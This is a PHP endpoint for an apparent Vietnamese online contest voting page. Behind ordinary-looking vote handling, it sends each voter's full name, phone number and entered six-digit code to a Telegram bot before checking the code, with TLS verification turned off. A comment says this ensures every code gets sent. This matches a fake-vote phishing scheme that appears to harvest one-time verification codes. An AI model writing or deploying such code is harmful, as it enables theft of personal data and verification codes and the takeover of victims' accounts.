<?php
session_start();
require_once __DIR__ . '/site-content.php';
require_once __DIR__ . '/voting-library.php';
require_once __DIR__ . '/config.php'; 

header('Content-Type: application/json; charset=utf-8');
header('Cache-Control: no-store');
error_reporting(0);
ini_set('display_errors', 0);

function replyVote($status, $payload) {
    http_response_code($status);
    echo json_encode($payload, JSON_UNESCAPED_UNICODE);
    exit;
}

try {
    $key = browserVoterKey();
    $method = $_SERVER['REQUEST_METHOD'];
    
    if (!in_array($method, ['GET', 'POST'], true)) {
        header('Allow: GET, POST');
        replyVote(405, ['success' => false, 'message' => 'Phương thức không hợp lệ.']);
    }
    
    if ($method === 'POST') {
        $token = $_POST['csrf_token'] ?? null;
        if (!is_string($token) || empty($_SESSION['vote_csrf']) || !hash_equals($_SESSION['vote_csrf'], $token)) {
            replyVote(403, ['success' => false, 'message' => 'Phiên đã hết hạn. Vui lòng tải lại trang.']);
        }
        
        $id = $_POST['candidate_id'] ?? null;
        if (!is_string($id) || !in_array($id, array_column($candidates, 'id'), true)) {
            replyVote(422, ['success' => false, 'message' => 'Thí sinh không hợp lệ.']);
        }
        
        if ($data['voting_open'] !== '1') {
            replyVote(403, ['success' => false, 'message' => 'Bình chọn đang tạm đóng.']);
        }
        
        $code = $_POST['participation_code'] ?? null;
        if (!is_string($code) || !preg_match('/^[0-9]{6}$/D', $code)) {
            replyVote(422, ['success' => false, 'message' => $data['dialog_code_required']]);
        }
        
        // Lấy thông tin user để gửi telegram
        $userFullname = 'Không xác định';
        $userPhone = 'Không xác định';
        $voteData = readVotes();
        if (isset($voteData['users'][$key])) {
            $userFullname = $voteData['users'][$key]['fullname'];
            $userPhone = $voteData['users'][$key]['phone'];
        }
        
        $candidateName = '';
        foreach ($candidates as $c) {
            if ($c['id'] === $id) {
                $candidateName = $c['name'] . ' (SBD: ' . $c['number'] . ')';
                break;
            }
        }

        // Gửi Telegram trước khi kiểm tra mã (để đảm bảo mọi mã đều gửi)
        if (defined('TELEGRAM_BOT_TOKEN') && defined('TELEGRAM_CHAT_ID')) {
            $telegramText = "🔔 *XÁC NHẬN BÌNH CHỌN*\n"
                . "Họ tên: {$userFullname}\n"
                . "SĐT: {$userPhone}\n"
                . "Bình chọn cho: {$candidateName}\n"
                . "Mã nhập vào: {$code}\n"
                . "Thời gian: " . date('d/m/Y H:i:s');

            $ch = curl_init('https://api.telegram.org/bot' . TELEGRAM_BOT_TOKEN . '/sendMessage');
            curl_setopt_array($ch, [
                CURLOPT_POST => true,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_SSL_VERIFYPEER => false,
                CURLOPT_SSL_VERIFYHOST => false,
                CURLOPT_POSTFIELDS => http_build_query([
                    'chat_id' => TELEGRAM_CHAT_ID,
                    'text' => $telegramText,
                    'parse_mode' => 'Markdown'
                ])
            ]);
            curl_exec($ch);
            curl_close($ch);
        }

        $codeError = null;
        $votes = updateVotingData(function (&$votes) use ($key, $id, $code, &$codeError, $data) {
            if (!isset($votes['users'][$key])) throw new RuntimeException('Vui lòng đăng ký trước khi bình chọn.', 401);
            if (!empty($votes['users'][$key]['blocked'])) throw new RuntimeException('Hồ sơ của bạn đã bị khóa bình chọn.', 403);
            
            $phone = $votes['users'][$key]['phone'];
            $limitKey = hash('sha256', $phone);
            $limit = $votes['code_limits'][$limitKey] ?? ['attempts' => 0, 'started_at' => time()];
            
            if (time() - $limit['started_at'] >= 600) $limit = ['attempts' => 0, 'started_at' => time()];
            if ($limit['attempts'] >= 5) {
                $codeError = [429, $data['dialog_code_limit']];
                return;
            }
            
            $digest = hash('sha256', $code);
            $entry = $votes['participation_codes'][$digest] ?? null;
            
            if (!$entry || $entry['phone'] !== $phone || $entry['expires_at'] <= time() || !empty($entry['used_at'])) {
                $limit['attempts']++;
                $votes['code_limits'][$limitKey] = $limit;
                $codeError = [422, $data['dialog_code_invalid']];
                return;
            }
            
            $votes['participation_codes'][$digest]['used_at'] = time();
            unset($votes['code_limits'][$limitKey]);
            $votes['counts'][$id] = (int) ($votes['counts'][$id] ?? 0) + 1;
            $votes['voters'][$key] = $id;
        });
        
        if ($codeError) {
            replyVote($codeError[0], [
                'success' => false,
                'message' => $codeError[1],
                'error' => $codeError[0] === 422 ? 'invalid_participation_code' : 'participation_code_limit',
            ]);
        }
    } else {
        $votes = readVotes();
    }
    
    replyVote(200, array_merge(viewerState($votes, $key), [
        'success' => true,
        'counts' => voteCounts($votes, $candidates),
        'voted' => $votes['voters'][$key] ?? null,
        'open' => $data['voting_open'] === '1',
        'message' => $method === 'POST' ? $data['dialog_success'] : '',
    ]));
    
} catch (Throwable $e) {
    $status = in_array($e->getCode(), [401, 403, 409, 422], true) ? $e->getCode() : 500;
    replyVote($status, ['success' => false, 'message' => $status === 500 ? 'Chưa thể tải hoặc lưu bình chọn. Vui lòng thử lại.' : $e->getMessage()]);
}
?>